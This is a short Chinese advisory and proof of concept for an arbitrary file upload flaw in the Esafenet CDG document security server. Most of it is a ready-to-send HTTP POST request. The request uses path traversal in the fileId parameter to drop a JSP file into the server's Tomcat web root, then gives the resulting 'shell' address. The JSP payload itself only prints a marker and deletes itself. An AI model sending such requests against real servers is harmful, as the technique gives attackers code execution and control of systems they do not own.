漏洞描述:亿赛通电子文档安全管理系统(简称:CDG)是一款电子文档安全防护软件。亿赛通电子文档安全管理系统任意文件上传
漏洞危害:攻击者可以上传恶意文件，获得服务器权限修复方法
官网已发布安全修复版本，请升级至官网最新版本
https://www.esafenet.com/



POST /CDGServer3/DecryptApplicationService2?fileId=../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/12345.jsp HTTP/1.1
Host:
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=E3B40EDFAC72A292489DBF7019B4AEA6
Connection: close
Content-Length: 254

<%@page import="java.text.*,java.util.*,java.io.*"%>
<%
SimpleDateFormat df = new SimpleDateFormat("yyy-MM-dd HH:mm:ss");
out.println(df.format(new Date()));
out.println("aaa");
File file = new File(application.getRealPath(request.getServletPath()));
file.delete();
%>




Shell 地址为：/CDGServer3/12345.jsp